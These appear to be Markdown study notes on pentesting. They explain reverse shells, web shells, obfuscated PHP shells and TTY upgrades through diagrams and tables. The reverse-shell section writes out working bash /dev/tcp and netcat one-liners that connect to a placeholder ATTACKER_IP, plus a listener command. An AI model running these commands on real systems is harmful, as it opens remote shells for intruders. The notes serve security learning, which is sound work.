# Reverse Shells

![480](../1.%20Linux/attachments/Pasted%20image%2020260711212444.png)

A **reverse shell** sends a payload to the target system that connects back to the attacker, giving shell access to the target's system.

There are two ways to get a reverse shell:

- **Reverse shell commands** — execute a command directly on the target
- **Reverse shell source code** — upload code to the target; when executed, it creates the shell

---

## Method 1: Reverse Shell via Command

If you already have **command execution (RCE)** on a Linux server, you can run:

```bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

or:

```bash
python3 -c '...'
```

or:

```bash
nc ATTACKER_IP 4444 -e /bin/bash
```

These are **commands** — no file is uploaded, no script is stored.

```
Attacker
     ▲
     │
Listener (nc -lvnp 4444)
     ▲
     │
Target
     │
     └── Executes ONE command
```

---

## Method 2: Reverse Shell via Source Code (e.g. PHP)

Upload a file like `shell.php` containing PHP reverse shell code:

```php
<?php
// PHP code that creates a reverse shell
?>
```

![](../1.%20Linux/attachments/Pasted%20image%2020260711213108.png)

> **Note:** PHP reverse shell code won't run in the terminal — it needs a PHP interpreter (web server).

When someone visits `http://target/shell.php`, the PHP interpreter executes the code and opens a reverse shell:

```
Attacker uploads shell.php
           │
           ▼
Target stores shell.php
           │
           ▼
Victim/Attacker accesses shell.php
           │
           ▼
PHP executes the source code
           │
           ▼
Reverse shell connects back
```

### Key Difference

| | Command-Based | Code-Based |
| --- | --- | --- |
| **Prerequisite** | Already have RCE | Can upload/place a file |
| **How it works** | OS runs the command directly | Interpreter (PHP/Python/etc.) runs the uploaded program |
| **File created?** | No | Yes |

The **goal is the same** (reverse shell) — the difference is **how you achieve it**.

# Web Shells

![](../1.%20Linux/attachments/Pasted%20image%2020260711213411.png)

A **web shell** is a small script placed on a web server that allows command execution **through HTTP/HTTPS** — a web-based command execution interface.

## Normal Website Flow

```
Browser
    │
HTTP Request
    │
    ▼
Web Server (Apache/Nginx/IIS)
    │
    ▼
PHP/ASP.NET/JSP executes code
    │
    ▼
Returns webpage
```

## With a Web Shell

```
Attacker
    │
HTTP Request
    │
    ▼
shell.php
    │
PHP executes commands
    │
    ▼
Linux Command Execution
    │
    ▼
Output returned in browser
```

Instead of showing a normal webpage, the script accepts commands and returns their output.

### Why "Web Shell"?

- Runs **through a web server**
- Controlled via **browser or HTTP requests**
- Provides **shell-like functionality** over the web
- It is **not** a terminal by itself

---

## Web Shell vs Reverse Shell

```
WEB SHELL                          REVERSE SHELL

Attacker                           Attacker (Listener)
      │                                     ▲
      ▼                                     │
HTTP Request                           TCP Connection
      │                                     │
      ▼                                     ▼
Target Web Server                   Target connects back
      │
Executes command
      │
Returns output
      │
      ▲
Attacker
```

| Feature | Web Shell | Reverse Shell |
| --- | --- | --- |
| Connection method | HTTP/HTTPS | TCP/UDP (or similar) |
| Initiates connection | Attacker sends requests | Target connects back |
| Interactive | Usually limited; one request per command | Yes |
| Requires browser | Often yes | No |
| Typical use | Initial foothold and command execution | Full interactive access |

### Common Progression in Pentesting

```
Upload web shell
        │
        ▼
Gain command execution
        │
        ▼
Execute reverse shell command
        │
        ▼
Receive interactive shell
```

### Web Shell Languages

- PHP (`.php`)
- ASP/ASP.NET (`.asp`, `.aspx`)
- JSP (`.jsp`)
- Perl (`.pl`)
- Python (for Python-based web frameworks)

The language depends on what the web server supports.

# Obfuscated PHP Web Shell

![543](../1.%20Linux/attachments/Pasted%20image%2020260711213630.png)

An **obfuscated PHP web shell** is a web shell whose source code has been deliberately made **difficult for humans and security tools to understand** while still behaving the same way when executed.

## What Is Obfuscation?

- Renaming variables to meaningless names
- Encoding strings
- Splitting code into many pieces
- Using functions that reconstruct code at runtime
- Hiding dangerous function names
- Making the code hard to read without changing its behavior

# TTY Spawn Shell

![](../1.%20Linux/attachments/Pasted%20image%2020260711223607.png)

A **TTY Spawn Shell** is the process of **upgrading a basic shell into a fully interactive terminal (TTY)**. This is a very common step after obtaining an initial shell during a penetration test.

## What Is a TTY?

**TTY** = **Teletypewriter**. Historically, users typed on physical teletype machines connected to Unix computers. Linux still refers to terminals as TTYs.

Today, a TTY is an **interactive terminal session** — terminal windows, SSH sessions, local Linux consoles, interactive Bash shells.

## Why Do We Need a TTY?

Many initial reverse shells are **non-interactive**:

```
Attacker
    ▲
    │
Reverse Shell
    │
    ▼
Target
```

You may get a `$` prompt, but it's limited.

### Problems with a Non-Interactive Shell

You often **cannot**:
- Use `sudo` or `su`
- Run editors like `nano` or `vim`
- Use arrow keys for command history
- Use `Ctrl + C` safely (may terminate the connection)
- Run interactive programs like `passwd`
- Get proper job control (`Ctrl + Z`, `fg`, `bg`)

### After Spawning a TTY

You get a proper terminal that behaves like a normal SSH session:
- Run interactive programs
- Use `sudo` / `su`
- Use command history
- Resize the terminal
- Use job control

## Visual Comparison

**Basic reverse shell:**

```
Attacker
     ▲
     │
Reverse Shell
     │
     ▼
Target

Limited shell
```

**Upgraded TTY shell:**

```
Attacker
     ▲
     │
Reverse Shell
     │
     ▼
Target

Interactive Bash
+
Pseudo Terminal
+
Job Control
```

### Why "Spawn TTY"?

"Spawn" = create a new process. So **Spawn TTY** = create an interactive terminal **inside** the existing shell.
